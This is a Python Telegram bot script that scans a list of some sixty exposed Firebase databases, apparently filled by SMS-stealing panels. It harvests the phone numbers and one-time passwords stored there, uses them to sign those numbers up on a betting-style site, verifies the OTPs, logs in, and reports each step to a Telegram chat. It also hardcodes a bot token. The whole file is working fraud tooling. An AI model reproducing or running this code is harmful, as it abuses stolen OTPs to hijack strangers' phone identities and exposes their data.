import os
import asyncio
import requests
import json
import time
import random
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==== Telegram Config ====
TOKEN = "8681990378:AAFbGpzsTXc7dBsl02aQQxk7iqsR64kCRz8"
CHAT_ID = -1004480783091

# ==== Site Config ====
TARGET_URL = "https://cyberking-1.online/index.php"
USER_ID = "your_fixed_user"   # <-- Change here
PASSWORD = "your_fixed_pass"  # <-- Change here
OPTIONS = ["789", "jackpot", "mbm", "bet"]

# ==== Firebase URLs (full list) ====
FIREBASE_URLS = [
    "https://a-bulk-default-rtdb.firebaseio.com",
    "https://atfihere-default-rtdb.firebaseio.com",
    "https://autoret1-d14a1-default-rtdb.firebaseio.com",
    "https://b-bulk-default-rtdb.firebaseio.com",
    "https://bhai-23119-default-rtdb.firebaseio.com",
    "https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
    "https://bhartiyajantaparty-58d7a-default-rtdb.europe-west1.firebasedatabase.app",
    "https://bro-bhai-default-rtdb.firebaseio.com",
    "https://chunnu-1a409-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://cumbck-65ede-default-rtdb.firebaseio.com",
    "https://cyberworld-c8600-default-rtdb.firebaseio.com",
    "https://desielhd-default-rtdb.firebaseio.com",
    "https://dogkol-default-rtdb.firebaseio.com",
    "https://e994jdnnd-default-rtdb.firebaseio.com",
    "https://ejju-f6446-default-rtdb.firebaseio.com",
    "https://falnidevi-e73d9-default-rtdb.firebaseio.com",
    "https://gaggf-323f0-default-rtdb.firebaseio.com",
    "https://ganori123-5547a-default-rtdb.firebaseio.com",
    "https://ghost-1b344-default-rtdb.firebaseio.com",
    "https://gold-6e8c4-default-rtdb.firebaseio.com",
    "https://gulu2580-b0bcc-default-rtdb.firebaseio.com",
    "https://hacking-montu-default-rtdb.firebaseio.com",
    "https://hairlook-6e564-default-rtdb.firebaseio.com",
    "https://honey-563c0-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://ilohsh-default-rtdb.firebaseio.com",
    "https://ioker-30d82-default-rtdb.firebaseio.com",
    "https://iran-2ba2f-default-rtdb.firebaseio.com",
    "https://kaliya-4b861-default-rtdb.firebaseio.com",
    "https://kamal-59ae8-default-rtdb.firebaseio.com",
    "https://kkklo-37025-default-rtdb.firebaseio.com",
    "https://kokpanda-f32a4-default-rtdb.firebaseio.com",
    "https://kumar-4d93e-default-rtdb.firebaseio.com",
    "https://ladh-cb-default-rtdb.firebaseio.com",
    "https://legend-pannel-66-default-rtdb.firebaseio.com",
    "https://mahi-rani-default-rtdb.firebaseio.com",
    "https://master-16beb-default-rtdb.firebaseio.com",
    "https://muajoim29c86-default-rtdb.firebaseio.com",
    "https://newproject-b2ea7-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://notmylevel-default-rtdb.firebaseio.com",
    "https://panel-58516-default-rtdb.firebaseio.com",
    "https://penal-waw-default-rtdb.firebaseio.com",
    "https://pm-ki-e0203-default-rtdb.firebaseio.com",
    "https://pm-kishan-30-huhj-default-rtdb.firebaseio.com",
    "https://preeti-5e1bf-default-rtdb.firebaseio.com",
    "https://rahul-guru-5db4f-default-rtdb.firebaseio.com",
    "https://rajeguenm-default-rtdb.firebaseio.com",
    "https://ramko-6c064-default-rtdb.firebaseio.com",
    "https://randi2-8d962-default-rtdb.firebaseio.com",
    "https://rani-c5a67-default-rtdb.firebaseio.com",
    "https://rathh-c26b8-default-rtdb.firebaseio.com",
    "https://rhsns-25c41-default-rtdb.firebaseio.com",
    "https://rto-yellow-default-rtdb.firebaseio.com",
    "https://senti-a5acf-default-rtdb.firebaseio.com",
    "https://shjsjsh-f7ce0-default-rtdb.firebaseio.com",
    "https://somhdhpwe-default-rtdb.firebaseio.com",
    "https://spy-18-default-rtdb.firebaseio.com",
    "https://subjuoeh-52af9-default-rtdb.firebaseio.com",
    "https://sumit2-ff0aa-default-rtdb.firebaseio.com",
    "https://super-admin-240f4-default-rtdb.firebaseio.com",
    "https://surya-1ce0e-default-rtdb.firebaseio.com",
    "https://ttttt-a6d8a-default-rtdb.firebaseio.com",
    "https://unknown-5b51e-default-rtdb.firebaseio.com",
    "https://vehal-78c69-default-rtdb.firebaseio.com",
    "https://vipnn-8998e-default-rtdb.firebaseio.com",
    "https://viyi-b0689-default-rtdb.firebaseio.com",
    "https://ydtjdd-f245f-default-rtdb.firebaseio.com"
]

# ==== Global variables ====
running = False
processed = set()
bot = Bot(token=TOKEN)

def clean_phone(p):
    p = p.strip()
    if p.startswith("+91"): p = p[3:]
    elif p.startswith("91") and len(p)>10: p = p[2:]
    return ''.join(filter(str.isdigit, p))

def test_url(url):
    try:
        r = requests.get(url.rstrip('/')+'/.json', timeout=15)
        return r.status_code==200 and isinstance(r.json(), dict)
    except: return False

def get_numbers(url):
    global processed
    nums = []
    try:
        r = requests.get(url.rstrip('/')+'/.json', timeout=15)
        if r.status_code!=200: return []
        data = r.json()
        if not isinstance(data,dict): return []
        for k,v in data.items():
            if isinstance(v,dict) and 'phone' in v:
                raw = v['phone']
                clean = clean_phone(raw)
                if clean and clean not in processed:
                    processed.add(clean)
                    nums.append((k, clean, v.get('otp'), url))
        return nums
    except: return []

def submit_phone(phone):
    s = requests.Session()
    s.get(TARGET_URL)
    opts = random.sample(OPTIONS, 2)
    data = {"phone": phone, "submit": "1"}
    for o in opts:
        data.setdefault("game[]", []).append(o)
    r = s.post(TARGET_URL, data=data, timeout=10)
    if "otp" in r.text.lower():
        return s, opts
    return None, None

def verify_otp(otp, s):
    r = s.post(TARGET_URL, data={"otp": otp, "verify": "1"}, timeout=10)
    if "success" in r.text.lower() or "verified" in r.text.lower():
        return True
    return False

def login(s):
    r = s.post(TARGET_URL, data={"user": USER_ID, "pass": PASSWORD, "login": "1"}, timeout=10)
    if "dashboard" in r.text.lower() or "welcome" in r.text.lower():
        return True
    return False

async def auto_signup_loop():
    global running
    # Test active URLs
    active = [u for u in FIREBASE_URLS if test_url(u)]
    if not active:
        await bot.send_message(chat_id=CHAT_ID, text="❌ No accessible Firebase DB found!")
        return
    await bot.send_message(chat_id=CHAT_ID, text=f"✅ Active URLs: {len(active)}\nStarting auto-signup...")
    
    while running:
        for url in active:
            for node, phone, otp, _ in get_numbers(url):
                if not running: return
                if phone:
                    session, opts = submit_phone(phone)
                    if session:
                        msg = f"[+] OTP sent to {phone} | options: {opts}"
                        print(msg)
                        await bot.send_message(chat_id=CHAT_ID, text=msg)
                        # Wait for OTP verification (max 60s)
                        verified = False
                        for _ in range(30):
                            await asyncio.sleep(2)
                            if not running: return
                            new = get_numbers(url)
                            for n, p, o, _ in new:
                                if p == phone and o:
                                    if verify_otp(o, session):
                                        await bot.send_message(chat_id=CHAT_ID, text=f"[+] OTP verified: {o}")
                                        if login(session):
                                            await bot.send_message(chat_id=CHAT_ID, text=f"[+] Logged in as {USER_ID}")
                                        verified = True
                                    break
                            if verified:
                                break
        await asyncio.sleep(10)

# ==== Telegram Handlers ====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running
    if update.effective_chat.id != CHAT_ID:
        await update.message.reply_text("Unauthorized")
        return
    if running:
        await update.message.reply_text("Already running.")
        return
    running = True
    await update.message.reply_text("Starting auto-signup...")
    asyncio.create_task(auto_signup_loop())

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global running
    if update.effective_chat.id != CHAT_ID:
        return
    running = False
    await update.message.reply_text("Stopped.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != CHAT_ID:
        return
    await update.message.reply_text(f"Running: {running}")

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("status", status))

    print("Bot is starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
